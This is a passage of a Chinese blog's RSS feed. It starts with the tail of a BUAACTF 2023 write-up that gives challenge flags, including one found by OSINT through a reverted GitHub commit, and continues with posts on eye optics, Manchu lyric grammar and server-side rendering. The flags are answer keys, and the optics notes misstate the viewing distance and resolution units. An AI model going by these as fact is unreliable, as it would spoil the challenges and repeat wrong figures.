        &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt;
        &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap.min.css&amp;quot;&amp;gt;
        &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/style.css&amp;quot;&amp;gt;
        &amp;lt;title&amp;gt;身高计算器&amp;lt;/title&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;h1&amp;gt;身高计算器&amp;lt;/h1&amp;gt;
        &amp;lt;h2&amp;gt;请输入你的身高&amp;lt;/h2&amp;gt;
        &amp;lt;form action=&amp;quot;/&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
            &amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;content&amp;quot; placeholder=&amp;quot;cm&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
            &amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
        &amp;lt;/form&amp;gt;
        &amp;lt;div class=&amp;quot;result&amp;quot;&amp;gt;您的身高为

{&amp;quot;arr&amp;quot;:[&amp;quot;{
&amp;quot;name&amp;quot;:&amp;quot;admin&amp;quot;,
&amp;quot;work_dir&amp;quot;:&amp;quot;/usr/admin/&amp;quot;
}
}&amp;quot;],&amp;quot;flag&amp;quot;:&amp;quot;flag{RUSt_1S_S0_1NTere4T1NG}&amp;quot;,&amp;quot;worker&amp;quot;:{&amp;quot;env_var&amp;quot;:&amp;quot;se3ret&amp;quot;,&amp;quot;id&amp;quot;:20379999,&amp;quot;name&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;work_dir&amp;quot;:&amp;quot;/usr/admin/&amp;quot;}}
 cm&amp;lt;/div&amp;gt;
    &amp;lt;/body&amp;gt;
    &amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;截图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Flag&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-rs&quot;&gt;flag{RUSt_1S_S0_1NTere4T1NG}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Screenshot&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;262 pts&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;小橘子在没事干的时候特别喜欢在各大社交平台灌水，某天他在某平台高强度冲浪的时候遇到了一位自称是BUAACTF2023出题人的网友。在交谈过程中，该网友不小心发送了一张电脑屏幕截图，这引起了小橘子的注意。如果能通过这张图片找到一些有用的信息，或许就能提前拿到比赛的flag……&lt;/p&gt;
&lt;p&gt;小橘子在该社交平台上的id：@PaulGeo43512452&lt;/p&gt;
&lt;p&gt;author：ch3v4l，bangzhu&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;附件&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;./screenshot.jpg&quot; alt=&quot;screenshot.jpg&quot;&gt;&lt;/p&gt;
&lt;h3&gt;解答&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://Ethereum.org&quot;&gt;Ethereum.org&lt;/a&gt; 的 Remix 没有社交功能，并且图中没有区块链信息。唯一符合要求的是第一个标签页的 Twitter。&lt;/p&gt;
&lt;p&gt;搜索可见一串对话。用 Stegsolve.jar 对比附件中的图片和从 twimg 下载的图片，没有差异；用 &lt;a href=&quot;http://hexed.it/&quot;&gt;hexed.it&lt;/a&gt; 和 binwalk 也没发现有隐藏信息。&lt;/p&gt;
&lt;p&gt;对话提示查看另一用户 NekoMaster0751 的 Github 仓库，在 bio 找到该用户的用户名。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;查阅其 &lt;a href=&quot;https://github.com/c4Tch3r/c4Tch3r.github.io&quot;&gt;仓库&lt;/a&gt; 历史，发现最近有一次添加了一篇文章 &lt;a href=&quot;https://github.com/c4Tch3r/c4Tch3r.github.io/commit/37f0f346eed58051f6aae6fce2adfd2cd35e08cb#diff-9aaa784dbaf430cfa4250f3c98d7ea2ae272831162100c4f0eb2a856138dd167&quot;&gt;&lt;code&gt;2023/04/19/BUAACTF2022题解/index.html&lt;/code&gt;&lt;/a&gt;，随后又 revert 的操作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./c4Tch3r.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;手动 revert 后，发现代码中并没有 flag。仔细查看，发现有多张图片没有加载。&lt;code&gt;meta{:html}&lt;/code&gt; 标签中有两张 Open Graph 预览图，但不是 flag，正文中的才是。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./revert.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://smms.app/image/KA3Cm4z7hWDncyk&quot;&gt;37e901a1b6cb8efdc24d9357875062c.png - SM.MS - Simple Free Image Hosting&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./KA3Cm4z7hWDncyk1.png&quot; alt=&quot;KA3Cm4z7hWDncyk1.png&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Flag&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;BUAACTF{Scr33nsh0T_0N_s0c1@L_M3di4_C4N_I3ak_y0ur_pr1V4cy!}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;strong&gt;问卷调查&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;119 pts&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[数据删除]&lt;/p&gt;
&lt;p&gt;完成问卷填写即可获得flag。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Flag&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;BUAACTF{GoOd_Bye~may_1he_f1ag_Be_wi1h_U}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;2023 年 4 月 26 日写于 Notion。&lt;/p&gt;
</content:encoded></item><item><title>人眼光学系统</title><link>https://blog.xinshijiededa.men/eye-as-an-optical-system/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/eye-as-an-optical-system/</guid><description>眼睛作为一个光学系统</description><pubDate>Fri, 09 Jun 2023 13:04:03 GMT</pubDate><content:encoded>&lt;h2&gt;光学系统&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;瞳孔&lt;/strong&gt;为孔径光阑．&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;明视距离&lt;/strong&gt;为 25 mm．&lt;/p&gt;
&lt;h2&gt;调节&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;远点距离&lt;/strong&gt; $R=\dfrac{1}{l_r},$&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;近点距离&lt;/strong&gt; $P=\dfrac{1}{l_p}.$&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调节能力&lt;/strong&gt; $A = R - P.$&lt;/p&gt;
&lt;p&gt;不知道为什么是这三个字母，姑且用 &lt;strong&gt;r&lt;/strong&gt;emote、&lt;strong&gt;p&lt;/strong&gt;roximate 同 &lt;strong&gt;a&lt;/strong&gt;ccommodation 记忆．&lt;/p&gt;
&lt;p&gt;以上 $A, R$ 和 $P$ 的单位为&lt;strong&gt;屈光度&lt;/strong&gt; $\mathrm D = \mathrm m^{-1}$ ．&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/e/ea/Accommodation_%28PSF%29.svg&quot; alt=&quot;近点和远点（公有领域）&quot;&gt;&lt;/p&gt;
&lt;h2&gt;反常眼&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;定义&lt;/th&gt;
&lt;th&gt;校正&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;正常眼&lt;/td&gt;
&lt;td&gt;$l_r=\infty$&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;近视眼&lt;/td&gt;
&lt;td&gt;$l_r&amp;lt;0$&lt;/td&gt;
&lt;td&gt;眼前加负透镜， $f&apos;=l_R$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;远视眼&lt;/td&gt;
&lt;td&gt;$l_r&amp;gt;0$&lt;/td&gt;
&lt;td&gt;眼前加正透镜， $f&apos;=l_R$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;眼镜&lt;/h2&gt;
&lt;p&gt;$D (D&amp;lt;0)$ 度的近视镜的焦距 $f&apos;=1/D.$ 佩戴 $D$ 度的近视镜后远点距离 $R&apos;=R-D.$&lt;/p&gt;
&lt;h3&gt;配近视镜&lt;/h3&gt;
&lt;p&gt;&amp;lt;b&amp;gt;对 $1\ \mathrm m$ 以外的景物看不清，须配怎样的眼镜?&amp;lt;/b&amp;gt;&lt;/p&gt;
&lt;p&gt;对 $1 \mathrm{m}$ 以外的景物看不清，说明眼睛近视，须配负透镜．由&lt;/p&gt;
&lt;p&gt;$$\dfrac{1}{f_0&apos;}=\dfrac{1}{l_{\mathrm{r}}}=\dfrac{1}{-1}=-1 \mathrm{D}$$&lt;/p&gt;
&lt;p&gt;或&lt;/p&gt;
&lt;p&gt;$$\frac{1}{f_0&apos;}=\frac 1{l&apos;}-\frac{1}{l}=\frac{1}{-1}-\frac{1}{-\infty}=-1 \mathrm D$$&lt;/p&gt;
&lt;p&gt;可知须配 $100$ 度的近视镜．&lt;/p&gt;
&lt;h3&gt;配远视镜&lt;/h3&gt;
&lt;p&gt;&amp;lt;b&amp;gt;对 $1\ \mathrm m$ 以内看不清，须配怎样的眼镜？&amp;lt;/b&amp;gt;&lt;/p&gt;
&lt;p&gt;${1\ \mathrm{m}}$ 以内看不清，说明眼睛远视，须配正透镜．由&lt;/p&gt;
&lt;p&gt;$$\frac{1}{f_0}=\frac 1{l&apos;}-\frac 1 l=\frac{1}{-1}-\frac{1}{-0.25}=3 \mathrm{D}$$&lt;/p&gt;
&lt;p&gt;可知须配 $300$ 度的远视镜．&lt;/p&gt;
&lt;h2&gt;分辨率&lt;/h2&gt;
&lt;p&gt;人眼的空间分辨率用&lt;strong&gt;极限分辨角&lt;/strong&gt; a.k.a. &lt;strong&gt;视角鉴别率&lt;/strong&gt; $\varepsilon$ 表示，是眼睛恰巧能分开的两点对眼睛物方节点所张的角度．&lt;/p&gt;
&lt;p&gt;由&lt;strong&gt;瑞利判据&lt;/strong&gt;（Rayleigh criterion），&lt;/p&gt;
&lt;p&gt;$$\varepsilon = \frac{1.22\lambda}D.$$&lt;/p&gt;
&lt;p&gt;对于 $\lambda=555\ \mathrm{nm}$ 的光线，&lt;/p&gt;
&lt;p&gt;$$\varepsilon=\frac{140}D (&apos;&apos;).$$&lt;/p&gt;
&lt;p&gt;其中 $D$ 为瞳孔直径．照明良好的情况下 $\varepsilon=60&apos;&apos;$ .&lt;/p&gt;
&lt;p&gt;眼睛观察方便也不吃力时，分辨角为 $2&apos;&apos;\sim 4&apos;&apos;$ .&lt;/p&gt;
&lt;p&gt;人眼的时间分辨率为 $25\ \mathrm{f/s}.$&lt;/p&gt;
&lt;h2&gt;立体视觉&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;视觉基线长度&lt;/strong&gt; $b$ 为两眼节点间长度；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;视角差&lt;/strong&gt; $\theta_A = \dfrac b L$ ，其中 $L$ 为物体距视觉基线的垂直距离；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;立体视差&lt;/strong&gt; a.k.a. &lt;strong&gt;视差&lt;/strong&gt; $\Delta\theta$ 是不同视角差之间的差值；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;体视锐度&lt;/strong&gt; $\Delta\theta_{\mathrm{min}}$ 是人眼可感觉到的视差的最小值，一般为 $10&apos;&apos;$ ；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;立体视觉半径&lt;/strong&gt; $L_\mathrm{max} = \dfrac b {\Delta\theta_\mathrm{min}}$ 是人眼可分辨远近的最大距离；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;立体视觉阈&lt;/strong&gt; $\Delta L=\dfrac{\Delta\theta L^2}{b}$ 是双眼能够分辨两点间的最小距离；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;立体视觉误差&lt;/strong&gt; $\Delta L |&lt;em&gt;{\Delta\theta=\Delta\theta&lt;/em&gt;\mathrm{min}}=\dfrac{\Delta\theta_\mathrm{min} L^2}{b}.$ &amp;lt;script src=&amp;quot;https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;lottie-player src=&amp;quot;https://assets9.lottiefiles.com/packages/lf20_hbWhzLFJJc.json&amp;quot; mode=&amp;quot;bounce&amp;quot; background=&amp;quot;transparent&amp;quot;  speed=&amp;quot;0.9&amp;quot;  style=&amp;quot;width: 64px; height: 64px;&amp;quot;  loop  autoplay&amp;gt;&amp;lt;/lottie-player&amp;gt;&lt;/li&gt;
&lt;/ol&gt;
</content:encoded></item><item><title>满文版《你笑起来真好看》歌词注解</title><link>https://blog.xinshijiededa.men/si-injeci-hon-saikan/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/si-injeci-hon-saikan/</guid><description>把所有的烦恼所有的忧愁统统都吹散</description><pubDate>Sat, 29 Apr 2023 23:00:00 GMT</pubDate><content:encoded>&lt;p&gt;import Index from &amp;quot;./_index.astro&amp;quot;;&lt;/p&gt;
&lt;p&gt;&amp;lt;Index /&amp;gt;&lt;/p&gt;
&lt;h2&gt;注释&lt;/h2&gt;
&lt;h3&gt;笑起来真好看&lt;/h3&gt;
&lt;p&gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;injeci&amp;lt;/span&amp;gt;: &amp;lt;code&amp;gt;动词-&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;ci&amp;lt;/span&amp;gt;&amp;lt;/code&amp;gt; 就是「…起来」。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;donjici&amp;lt;/span&amp;gt;	是「听说」，就是「听起来」。&lt;/li&gt;
&lt;li&gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;tuwaci&amp;lt;/span&amp;gt; 是「看起来」：&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;tuwaci si urui niyalma be yohindarakū.&amp;lt;/span&amp;gt; 看起来你总是藐视人。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;想要做和祈使&lt;/h3&gt;
&lt;p&gt;&amp;lt;code&amp;gt;动词-&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;ki&amp;lt;/span&amp;gt;&amp;lt;/code&amp;gt; 可以表示「想要…」和「请…」的意思。歌词中 &amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;sini emgi biki&amp;lt;/span&amp;gt; 即为「想要和你在一起」；&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;tuwanaki&amp;lt;/span&amp;gt;（&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;tuwanambi&amp;lt;/span&amp;gt;） 则是「想去看」。&lt;/p&gt;
&lt;p&gt;&amp;lt;code&amp;gt;动词-&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;kini&amp;lt;/span&amp;gt;&amp;lt;/code&amp;gt; 则表示祈使，即希望（使某人）做。&lt;code&gt;bikini&lt;/code&gt; 是「听其自便」的意思。&lt;/p&gt;
&lt;p&gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;okini&amp;lt;/span&amp;gt;（&lt;code&gt;ombi&lt;/code&gt; 成为；足够）除了本身的变形，又常用作「罢了」的意思，如 &amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;uthai … okini&amp;lt;/span&amp;gt;表示让步，「即使……」；另外还可以表达祝愿之意，比如  &amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;hacin inenggi sebjen&amp;lt;b&amp;gt;okini&amp;lt;/b&amp;gt;&amp;lt;/span&amp;gt; 为「元宵节快乐」，&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;beye katun guigu &amp;lt;b&amp;gt;okini&amp;lt;/b&amp;gt;&amp;lt;/span&amp;gt; 为「祝你身体健康」。&lt;/p&gt;
&lt;h3&gt;来去之间&lt;/h3&gt;
&lt;p&gt;在动词词根后、时态变化前加上 &amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;-na/ne/no-&amp;lt;/span&amp;gt; 表示「&lt;strong&gt;去&lt;/strong&gt;做某事」。歌词中的 &amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;tuwanaki&amp;lt;/span&amp;gt;「想去看」其实是 &amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;tuwa- + -na- + -ki&amp;lt;/span&amp;gt;，&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;tuwambi&amp;lt;/span&amp;gt; 就是「看，阅，观察」。&lt;/p&gt;
&lt;p&gt;&amp;lt;table&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;th&amp;gt;词性&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;满语&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;汉语&amp;lt;/th&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/thead&amp;gt;
&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td rowspan=&amp;quot;2&amp;quot;&amp;gt;阳性&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;amga&amp;lt;b&amp;gt;na&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;去瞓&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;unca&amp;lt;b&amp;gt;na&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;去卖&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td rowspan=&amp;quot;2&amp;quot;&amp;gt;中性&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;hebde&amp;lt;b&amp;gt;ne&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;去商量&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;fude&amp;lt;b&amp;gt;ne&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;去送行&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td rowspan=&amp;quot;2&amp;quot;&amp;gt;阴性&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;bošo&amp;lt;b&amp;gt;no&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;去催促&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;dorolo&amp;lt;b&amp;gt;no&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;去行礼&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/tbody&amp;gt;
&amp;lt;/table&amp;gt;&lt;/p&gt;
&lt;p&gt;在动词词根后、时态变化前加上 &amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;-nji-&amp;lt;/span&amp;gt; 表示「&lt;strong&gt;来&lt;/strong&gt;做某事」。&lt;/p&gt;
&lt;p&gt;&amp;lt;table&amp;gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;满语&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;汉语&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/thead&amp;gt;&amp;lt;tbody&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;ala&amp;lt;b&amp;gt;nji&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;来告诉&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;uda&amp;lt;b&amp;gt;nji&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;来买&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;be&amp;lt;b&amp;gt;nji&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;送来&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;elde&amp;lt;b&amp;gt;nji&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;光临&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;nukte&amp;lt;b&amp;gt;nji&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;来游牧&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;šoforo&amp;lt;b&amp;gt;nji&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;来抓&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span lang=&amp;quot;moe&amp;quot;&amp;gt;dorolo&amp;lt;b&amp;gt;nji&amp;lt;/b&amp;gt;mbi&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;来行礼&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>服务端渲染阵营九宫格</title><link>https://blog.xinshijiededa.men/ssr-alignment-chart/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/ssr-alignment-chart/</guid><description>你就说是不是渲染吧！</description><pubDate>Sun, 09 Apr 2023 01:50:00 GMT</pubDate><content:encoded>&lt;p&gt;&amp;lt;blockquote&amp;gt;&amp;lt;i class=&amp;quot;fa-solid fa-circle-info&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 这篇文章显然是经服务端渲染而呈现在你面前的。&amp;lt;/blockquote&amp;gt;
&amp;lt;table class=&amp;quot;alignment-chart&amp;quot;&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;th&amp;gt;&amp;lt;/th&amp;gt;
&amp;lt;th class=&amp;quot;h&amp;quot;&amp;gt;守序&amp;lt;div&amp;gt;一定要用 JS 框架渲染&amp;lt;/div&amp;gt;&amp;lt;/th&amp;gt;
&amp;lt;th class=&amp;quot;h&amp;quot;&amp;gt;中立&amp;lt;div&amp;gt;渲染出来的是 HTML 就行&amp;lt;/div&amp;gt;&amp;lt;/th&amp;gt;
&amp;lt;th class=&amp;quot;h&amp;quot;&amp;gt;混乱&amp;lt;div&amp;gt;渲染出来是图形就行&amp;lt;/div&amp;gt;&amp;lt;/th&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/thead&amp;gt;
&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td class=&amp;quot;h&amp;quot;&amp;gt;善良&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;img src=&amp;quot;https://upload.wikimedia.org/wikipedia/commons/8/8e/Nextjs-logo.svg&amp;quot;&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;img src=&amp;quot;https://www.php.net/images/logos/php-logo.svg&amp;quot;&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;img src=&amp;quot;https://user-images.githubusercontent.com/20166026/230817316-92c7c746-0b5d-4307-90af-08bff113787e.png&amp;quot;&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;一定要在&amp;lt;br /&amp;gt;服务端渲染&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;守序善良&amp;lt;/div&amp;gt; Next 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;中立善良&amp;lt;/div&amp;gt; PHP 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;混乱善良&amp;lt;/div&amp;gt; RDP 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td class=&amp;quot;h&amp;quot;&amp;gt;中立&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;div&amp;gt;
&amp;lt;img loading=&amp;quot;lazy&amp;quot; src=&amp;quot;https://miro.medium.com/v2/resize:fit:400/1*-8c5bXmKhpKg8NRnBMu0zQ.gif&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div style=&amp;quot;padding-top: 4px;&amp;quot;&amp;gt;&amp;lt;img style=&amp;quot;background-color: rgb(34, 34, 34);&amp;quot; src=&amp;quot;https://pages.github.com/images/logo.svg&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;img loading=&amp;quot;lazy&amp;quot; src=&amp;quot;https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg&amp;quot;&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;img loading=&amp;quot;lazy&amp;quot; src=&amp;quot;https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/Open_Broadcaster_Software_Logo.png/2048px-Open_Broadcaster_Software_Logo.png&amp;quot;&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;不在直接交互的&amp;lt;br /&amp;gt;服务器上渲染也行&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;守序中立&amp;lt;/div&amp;gt; SSG 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;绝对中立&amp;lt;/div&amp;gt; CDN 是 SSR&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;&amp;lt;div class=&amp;quot;cat&amp;quot;&amp;gt;混乱中立&amp;lt;/div&amp;gt; OBS 推流是 SSR&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
